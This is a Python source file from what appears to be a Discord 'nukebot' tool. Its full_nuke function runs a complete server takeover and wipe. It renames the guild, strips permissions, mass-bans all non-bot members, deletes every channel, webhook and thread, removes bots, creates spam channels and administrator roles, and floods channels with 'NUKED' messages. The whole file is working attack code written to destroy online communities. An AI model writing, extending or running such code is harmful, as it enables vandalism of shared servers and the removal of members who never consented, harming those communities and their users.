"""All-in-one server nuke orchestration."""

from __future__ import annotations

import random

import discord

from nukebot.core.templates import random_name
from nukebot.features import channels, roles, members, messages, server, emojis, integrations
from nukebot.features.common import Context, Result


async def full_nuke(ctx: Context, spam_channels: int = 50, spam_messages: int = 20) -> list[Result]:
    results: list[Result] = []

    # Backup before destruction.
    from nukebot.features.utility import backup_guild

    results.append(await backup_guild(ctx))

    # Rename server.
    results.append(await server.rename_server(ctx, random_name("nuked", 8)))

    # Permission nuke.
    results.append(await roles.permission_nuke(ctx, None))

    # Mass ban non-bot members.
    targets = [m for m in ctx.guild.members if not m.bot and m.id != ctx.client.user.id]
    results.append(await members.mass_ban(ctx, targets, reason="Full nuke", delete_message_days=7))

    # Delete all channels (snapshot first).
    all_channels = list(ctx.guild.channels)
    results.append(await channels.delete_channels(ctx, all_channels))

    # Create spam channels.
    results.append(await channels.create_channels(ctx, "text", "nuked-{i}", spam_channels))

    # Create spam roles.
    results.append(await roles.create_roles(ctx, "nuked-role-{i}", 25, administrator=True))

    # Remove bots.
    bots = [m for m in ctx.guild.members if m.bot]
    results.append(await integrations.remove_bots(ctx, bots))

    # Delete webhooks.
    from nukebot.features import webhooks as webhook_features

    all_webhooks = await webhook_features.list_webhooks(ctx)
    results.append(await webhook_features.delete_webhooks(ctx, all_webhooks))

    # Delete threads.
    from nukebot.features import threads as thread_features

    results.append(await thread_features.delete_threads(ctx, list(ctx.guild.threads)))

    # Spam messages in newly created text channels.
    new_channels = [c for c in ctx.guild.text_channels]
    for channel in new_channels[:10]:
        results.append(await messages.spam_messages(ctx, channel, "NUKED", spam_messages, delay=0.2))

    return results
